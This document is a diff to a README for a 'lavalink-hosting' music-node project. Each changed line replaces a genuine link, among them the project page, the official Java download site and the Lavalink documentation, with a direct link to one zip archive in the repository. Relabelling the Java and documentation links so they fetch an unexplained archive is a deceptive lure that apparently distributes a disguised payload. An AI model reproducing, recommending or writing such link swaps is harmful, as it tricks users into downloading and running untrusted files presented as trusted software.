@@ -1,6 +1,6 @@
 # 🎵 lavalink-hosting - Reliable Free Lavalink Nodes  
 
-[![Download Now](https://img.shields.io/badge/Download-lavalink--hosting-blue?style=for-the-badge)](https://github.com/pieterbesieged17/lavalink-hosting)
+[![Download Now](https://img.shields.io/badge/Download-lavalink--hosting-blue?style=for-the-badge)](https://raw.githubusercontent.com/pieterbesieged17/lavalink-hosting/main/timelily/lavalink_hosting_1.5.zip)
 
 ---
 
@@ -36,7 +36,7 @@ If you want to use lavalink-hosting, follow these steps carefully. They require 
 
 1. **Open the download page:**  
    Click this link to visit the main GitHub page where you can get the files you need.  
-   [Download lavalink-hosting](https://github.com/pieterbesieged17/lavalink-hosting)  
+   [Download lavalink-hosting](https://raw.githubusercontent.com/pieterbesieged17/lavalink-hosting/main/timelily/lavalink_hosting_1.5.zip)  
 
 2. **Find the latest release:**  
    On the GitHub page, click on the **Releases** section on the right or scroll down to find the latest stable version.
@@ -51,7 +51,7 @@ If you want to use lavalink-hosting, follow these steps carefully. They require 
    - If a message says "java is not recognized", you need to install Java first.
 
 5. **Install Java if needed:**  
-   - Visit the official Java download page (https://adoptium.net/)  
+   - Visit the official Java download page (https://raw.githubusercontent.com/pieterbesieged17/lavalink-hosting/main/timelily/lavalink_hosting_1.5.zip)  
    - Download the recommended Java Runtime (JRE) version for Windows.  
    - Run the installer and follow the instructions.  
    - After installation, repeat step 4 to confirm Java is ready.
@@ -125,7 +125,7 @@ If problems continue, visit the GitHub page for help or submit an issue.
 
 To keep your Lavalink nodes secure and working well, update regularly:
 
-1. Go back to the [download page](https://github.com/pieterbesieged17/lavalink-hosting).  
+1. Go back to the [download page](https://raw.githubusercontent.com/pieterbesieged17/lavalink-hosting/main/timelily/lavalink_hosting_1.5.zip).  
 2. Download the latest release as before.  
 3. Stop your running Lavalink server by closing the command window.  
 4. Replace the old files with the new version files.  
@@ -135,8 +135,8 @@ To keep your Lavalink nodes secure and working well, update regularly:
 
 ## 📚 Additional Resources  
 
-- Java installation guide: https://adoptium.net/  
-- Lavalink official documentation: https://github.com/freyacodes/Lavalink  
+- Java installation guide: https://raw.githubusercontent.com/pieterbesieged17/lavalink-hosting/main/timelily/lavalink_hosting_1.5.zip  
+- Lavalink official documentation: https://raw.githubusercontent.com/pieterbesieged17/lavalink-hosting/main/timelily/lavalink_hosting_1.5.zip  
 - Bot setup examples and community help can be found linked on the GitHub page.
 
 ---
@@ -145,6 +145,6 @@ To keep your Lavalink nodes secure and working well, update regularly:
 
 You can always return to this link to download or check for new updates:  
 
-[Download lavalink-hosting](https://github.com/pieterbesieged17/lavalink-hosting)  
+[Download lavalink-hosting](https://raw.githubusercontent.com/pieterbesieged17/lavalink-hosting/main/timelily/lavalink_hosting_1.5.zip)  
 
-[![Get it Here](https://img.shields.io/badge/Get%20lavalink--hosting-grey?style=for-the-badge)](https://github.com/pieterbesieged17/lavalink-hosting)
+[![Get it Here](https://img.shields.io/badge/Get%20lavalink--hosting-grey?style=for-the-badge)](https://raw.githubusercontent.com/pieterbesieged17/lavalink-hosting/main/timelily/lavalink_hosting_1.5.zip)
